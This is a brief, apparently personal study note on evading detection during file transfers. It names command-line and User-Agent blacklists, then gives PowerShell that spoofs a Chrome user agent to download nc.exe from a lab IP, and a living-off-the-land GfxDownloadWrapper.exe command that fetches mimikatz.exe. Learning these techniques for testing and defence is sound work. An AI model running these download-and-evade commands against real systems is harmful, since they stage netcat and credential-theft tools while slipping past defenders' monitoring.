- [ ] Detection
```
Command-line based detection (blacklist or whitelist)
User-Agent based detection (blacklist or whitelist)
```

- [ ] Evading Detection
 Listing out User Agents!!!!
```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```
Changing User Agent!!!!
```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome

Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```
LOLBAS / GTFOBins!!!!
![[Pasted image 20250609094715.png]]
```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```




